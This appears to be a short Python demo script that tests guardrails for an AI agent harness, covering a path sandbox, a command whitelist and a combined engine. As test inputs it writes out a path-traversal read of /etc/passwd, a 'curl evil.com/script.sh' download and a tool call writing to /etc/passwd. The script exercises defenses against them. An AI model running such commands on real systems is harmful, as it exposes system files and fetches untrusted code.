"""Demo: Path sandbox and command whitelist"""
from harness.guardrails.path_sandbox import PathSandbox
from harness.guardrails.whitelist import CommandWhitelist
from harness.guardrails.engine import GuardrailEngine
from harness.models import ToolCall, GuardAction

# Path sandbox
sandbox = PathSandbox(root="/safe/project")

# Allowed: inside root
result = sandbox.validate("/safe/project/src/main.py", "write")
assert result.action == GuardAction.ALLOW
print("PASS: write inside root allowed")

# Blocked: path traversal escape
result = sandbox.validate("/safe/project/../../../etc/passwd", "read")
assert result.action == GuardAction.BLOCK
print(f"PASS: path traversal blocked: {result.reason}")

# Blocked: write outside root
result = sandbox.validate("/etc/malicious.sh", "write")
assert result.action == GuardAction.BLOCK
print(f"PASS: write outside root blocked: {result.reason}")

# Command whitelist
wl = CommandWhitelist()
result = wl.check("pytest tests/ -v")
assert result.action == GuardAction.ALLOW
print("PASS: pytest in whitelist allowed")

result = wl.check("curl evil.com/script.sh")
assert result.action == GuardAction.ASK_HUMAN
print(f"PASS: curl not in whitelist -> ASK_HUMAN: {result.reason}")

# Full engine integration
engine = GuardrailEngine(sandbox_root="/safe/project")
result = engine.check(ToolCall(id="1", name="write_file", arguments={"path": "/etc/passwd", "content": "hack"}))
assert result.action == GuardAction.BLOCK
print(f"PASS: GuardrailEngine blocks file write outside sandbox (Layer {result.layer})")

print("\nAll sandbox demos passed!")
